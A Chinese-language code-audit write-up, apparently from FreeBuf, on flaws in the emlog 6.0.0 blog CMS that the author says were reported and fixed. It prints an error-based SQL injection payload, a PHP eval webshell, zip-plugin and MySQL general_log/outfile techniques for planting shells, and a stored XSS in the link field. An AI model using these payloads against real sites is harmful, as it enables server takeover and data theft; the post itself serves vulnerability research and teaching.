***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 一、前言

 **本小菜也是刚开始玩代码审计，最近发现个比较有趣的CMS跟大家分享一波，虽然只找到一些鸡肋漏洞。废话不多说开始进入正题，本次审计的CMS是emlog
6.0.0版本，官方地址为：<http://www.emlog.net>。**

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550133424_5c6528b04e8c6.png!small)

## 二、审计思路

在学习前辈们的文章后，自己稍微总结一下代码审计的思路主要可以分为以下四种。

> 1） 查找可控变量，正向追踪变量传递过程，查看变量是否进行进行过滤，是否进行后台交互。
>
> 2） 查找敏感函数，如Select、Insert等，回溯该函数的参数是否进行过滤、是否可控。
>
> 3） 寻敏感功能点，通读功能点模块，如上传点。
>
> 4） 直接通读全文代码，这种方式能够更好的理解代码的业务逻辑，能够挖掘出更有价值的漏洞

## 三、审计过程

### 1\. Sql注入

废话不多说，像本小菜这种级别的还是比较喜欢第一种思路，简单粗暴。

首先了解一下代码大概逻辑结构，然后用notepad大法搜索一下$_GET参数看看哪些输入没进行过滤，我们再进行切入。通过搜索发现/admin/comment.php中未对$_GET[‘ip’]进行任何限制，接下来就查看IP这个参数是否进行了敏感操作。

![emlog 6.0
代码审计](https://image.3001.net/images/20190130/1548810783_5c50fa1faf232.png!small)

当action等于delbyip时，对token进行判定，查看是否是管理员，然后将$_GET[‘ip’]赋值给$ip，然后再调用dleCommentByIp($ip)函数，代码如下：

    
    
    if ($action== 'delbyip') {
        LoginAuth::checkToken();
        if (ROLE != ROLE_ADMIN) {
            emMsg('权限不足！', './');
        }
        $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
        $Comment_Model->delCommentByIp($ip);
        $CACHE->updateCache(array('sta','comment'));
        emDirect("./comment.php?active_del=1");
    }

接下来进行跟进class
Comment_Model的delCommentByIp函数，继续使用搜索大法，在/inludes/model/comment_model.php中发现delCommentByIp函数，跟进delCommentByIp函数，可以看出这个函数直接将传入的参数$ip,代入"SELECT
DISTINCT gid FROM ".DB_PREFIX."comment WHERE
ip='$ip'"进行sql查询，此过程中未发现任何过滤行为，我们只需通过封闭单引号然后进行报错注入。

    
    
    function delCommentByIp($ip) {
            $blogids = array();
            $sql = "SELECT DISTINCT gid FROM ".DB_PREFIX."comment WHERE ip='$ip'";
            $query = $this->db->query($sql);
            while ($row = $this->db->fetch_array($query)) {
                $blogids[] = $row['gid'];
            }
            $this->db->query("DELETE FROM ".DB_PREFIX."comment WHERE ip='$ip'");
            $this->updateCommentNum($blogids);
        }  
    

接下来就进行漏洞验证了，访问<http://127.0.0.1/emlog/admin/comment.php>，点击根据ip删除，用burpsuite抓取数据包，构造payload

/emlog/admin/comment.php?action=delbyip&token=abac6e12c2abe9b29797b64481ef6ed4&ip=127.0.0.1'and
(extractvalue(1,concat(0x7e,(select user()),0x7e)))#
注入时得进行编码处理才能成功，当然各位师傅的骚操作比我多。

![emlog 6.0
代码审计](https://image.3001.net/images/20190130/1548811920_5c50fe90ba0e9.png!small)比较尴尬的是该注入点进行了权限校验，也就是说只有管理员才能注入，所以该漏洞十分的鸡肋，当然也只是分享一下自己的学习审计过程。  

### 2\. 文件上传漏洞

在admin/plugin.php插件上传处存在上传漏洞，通过上传zip压缩的文件，即可上传木马文件。在plugin.php约79行处的上传点当action为upload_zip进行判断，先判断是否上传文件是否为空..

    
    
    if ($action == 'upload_zip') {
        LoginAuth::checkToken();
        $zipfile = isset($_FILES['pluzip']) ? $_FILES['pluzip'] : '';
    
        if ($zipfile['error'] == 4) {
            emDirect("./plugin.php?error_d=1");
        }
        if (!$zipfile || $zipfile['error'] >= 1 || empty($zipfile['tmp_name'])) {
            emMsg('插件上传失败');
        }
        if (getFileSuffix($zipfile['name']) != 'zip') { //判断后缀名是否为zip
            emDirect("./plugin.php?error_f=1");
        }
    
        $ret = emUnZip($zipfile['tmp_name'], '../content/plugins/', 'plugin');//解压zip文件到../content/plugins/目录下
        switch ($ret) {
            case 0:
                emDirect("./plugin.php?activate_install=1#tpllib");
                break;
            case -1:
                emDirect("./plugin.php?error_e=1");
                break;
            case 1:
            case 2:
                emDirect("./plugin.php?error_b=1");
                break;
            case 3:
                emDirect("./plugin.php?error_c=1");
                break;
        }
    }

然后通过include\lib\function.base.php中的getFilesuSuffix函数获取后缀名，并判断是否为zip。

    
    
    function getFileSuffix($fileName) {
        return strtolower(pathinfo($fileName,  PATHINFO_EXTENSION));
    }  
    

之后通过include\lib\function.base.php中emUnzip函数进行解压zip文件，在解压的过程中会对压缩包里的文件名称进行判断，如果你压缩包名称为test则压缩包里必须存在test.php文件，否者会进行报错。

    
    
    function emUnZip($zipfile, $path, $type = 'tpl') {
        if (!class_exists('ZipArchive', FALSE)) {
            return 3;//zip模块问题
        }
        $zip = new ZipArchive();
        if (@$zip->open($zipfile) !== TRUE) {
            return 2;//文件权限问题
        }
        $r = explode('/', $zip->getNameIndex(0), 2);
        $dir = isset($r[0]) ? $r[0] . '/' : '';
        switch ($type) {
            case 'tpl':
                $re = $zip->getFromName($dir . 'header.php');
                if (false === $re)
                    return -2;
                break;
            case 'plugin':
                $plugin_name = substr($dir, 0, -1);
                $re = $zip->getFromName($dir . $plugin_name . '.php');//判断是否存在与文件夹名称相同的php文件
                if (false === $re)
                    return -1;
                break;
            case 'backup':
                $sql_name = substr($dir, 0, -1);
                if (getFileSuffix($sql_name) != 'sql')
                    return -3;
                break;
            case 'update':
                break;
        }
        if (true === @$zip->extractTo($path)) {
            $zip->close();
            return 0;
        } else {
            return 1;//文件权限问题
        }
    }  
    

 **漏洞验证：**

将一句话木马以zip格式进行压缩

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550128604_5c6515dc2741c.png!small)然后在插件上传处上传插件

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550128700_5c65163cb3a82.png!small)

上传成功后使用菜刀连接content/plugins/test1/test1.php，获取webshell。

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550128884_5c6516f4b208c.png!small)

### 3\. 数据库备份拿shell

数据库拿shell主要有两种方式：

> 1、select ...into outfile 利用需要的条件有：对web目录需要有写权限；能够使用单引号；知道绝对路径；没有配置-secure-> file-priv
>
> 2、通过general_log，将日志写入特定目录下，利用条件又：对web目录需要要写权限；能够使用单引号；知道绝对路径；能够执行多行sql语句。

先尝试第一种方法，先备份sql语句，在其基础上插入select “<?php @eval($_POST['cmd']) ?>” into outfile
'eval.php'语句就ok了,但是由于配置了secure-file-priv,所以GG,这个方法行不通。

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550131534_5c65214e0968e.png!small)

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550132158_5c6523be87876.png!small)![emlog
6.0
代码审计](https://image.3001.net/images/20190214/1550132163_5c6523c351523.png!small)

使用第二种方法，设置了 general_log 和 general_log_file
之后所有SQL记录都会写入指定的文件，所以可以通过这种方法将php语句写到log中。查询语句如下

    
    
    set global general_log='on';
    
    SET global general_log_file='C:/phpStudy/PHPTutorial/WWW/emlog/eval.php'; 
    
    SELECT '<?php phpinfo();?>';

接下来操作如上导入备份文件即可，在C:/phpStudy/PHPTutorial/WWW/emlog/目录下生成eval.php的log文件。

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550133138_5c65279280856.png!small)

访问<http://127.0.0.1/emlog/eval.php>，查看获取shell。

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550133231_5c6527ef76861.png!small)

### 4\. 存储型xss

后台链接添加处[admin/link.php](http://localhost/admin/link.php)
,siteurl参数输出时未进行实体化处理导致，存储型xss。在$action=addlink时，通过addslashes函数进行转义处理，防止进行sql注入，但是未进行任何的html实体化，或者过滤处理。通过第44行代码可发现进行了正则匹配所以我们构造的payload需以http、ftp开头，才能进型数据插入。

    
    
    if ($action== 'addlink') {
        $taxis = isset($_POST['taxis']) ? intval(trim($_POST['taxis'])) : 0;
        $sitename = isset($_POST['sitename']) ? addslashes(trim($_POST['sitename'])) : '';
        $siteurl = isset($_POST['siteurl']) ? addslashes(trim($_POST['siteurl'])) : '';
        $description = isset($_POST['description']) ? addslashes(trim($_POST['description'])) : '';
    
        if ($sitename =='' || $siteurl =='') {
            emDirect("./link.php?error_a=1");
        }
        if (!preg_match("/^http|ftp.+$/i", $siteurl)) { //需以http、ftp开头，
            $siteurl = 'http://'.$siteurl;
        }
        $Link_Model->addLink($sitename, $siteurl, $description, $taxis);
        $CACHE->updateCache('link');
        emDirect("./link.php?active_add=1");
    }
    
    

通过addLink函数插入链接，接下来跟进/include/model/link_model.php中的link_Model->addLink函数，该函数将经过addslashes转义完的链接插入数据库
进行存储。  

    
    
    function addLink($name, $url, $des, $taxis) {
    		if ($taxis > 30000 || $taxis < 0) {
    			$taxis = 0;
    		}
    		$sql="insert into ".DB_PREFIX."link (sitename,siteurl,description,taxis) values('$name','$url','$des', $taxis)";
    		$this->db->query($sql);
    	}
    

接下来跟进输出情况，当action参数为空，通过/include/model/link_model.php中的Link_Model->getLinks()函数从数据库查询sitename、description、siteurl，并返回查询结果，最后由View::output()进行输出。getLinks()函数查询数据库获取，获取sitename、description、siteurl数据，查看可发现未对siteurl参数进行实体化和过滤处理。

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550135925_5c6532756500a.png!small)

查看/include/lib/view.php
中的View::output函数，最后结果通过echo输出，在整个过程都未对siteurl进行实体化、过滤处理，导致最终造成存储型xss。

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550135971_5c6532a36d24e.png!small)

漏洞验证

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550135440_5c65309017a38.png!small)

![emlog 6.0
代码审计](https://image.3001.net/images/20190214/1550135478_5c6530b60b0df.png!small)

## 四、结束语  

这个cms漏洞当然不止这些，还有很多问题。其实整个过程中审计的漏洞利用价值都不大，堪称鸡肋，本文只是分享自己学习的过程，由简单到复杂，分享一下自己的学习体会而已，望各位师傅多多包涵。

 ***本文作者：fishyyh，转载请注明来自FreeBuf.COM。**

